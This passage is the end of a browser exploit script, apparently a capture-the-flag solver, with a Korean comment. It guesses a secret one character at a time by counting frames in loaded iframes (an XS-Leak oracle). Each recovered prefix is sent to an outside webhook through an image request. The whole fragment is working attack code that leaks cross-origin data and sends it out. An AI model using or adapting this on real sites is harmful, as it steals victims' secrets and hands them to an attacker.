          if (iframe.contentWindow.length > 0) {
            known += c;
            round++;
            new Image().src = WH + "?round=" + round + "&known=" + encodeURIComponent(known);
            // 다음 글자 찾기
            findNext();
          }
        } catch(e) {}
        document.body.removeChild(iframe);
      };
      document.body.appendChild(iframe);
    })(chars[i]);
  }
}

findNext();
</script>
